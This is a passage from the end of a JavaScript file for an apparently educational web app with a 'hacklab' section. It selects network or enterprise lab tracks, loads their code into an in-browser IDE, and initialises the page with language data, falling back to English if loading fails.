                    else if (tmpl === 'network') track = data.hacklab_section.tracks.find(t => t.id === 'track_network');
                    else if (tmpl === 'enterprise') track = data.hacklab_section.tracks.find(t => t.id === 'track_enterprise');

                    if (track) loadTrackCodeIntoLab(track, currentLang);
                }
            });
        });
    }

    // Initialize Application
    async function init() {
        initIDE();
        setupNav();
        setupGlobalSearch();

        try {
            const data = await loadLanguageData(currentLang);
            renderApp(data, currentLang);
        } catch (e) {
            console.error('Initial load error:', e);
            if (currentLang !== 'en') {
                currentLang = 'en';
                const data = await loadLanguageData('en');
                renderApp(data, 'en');
            }
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
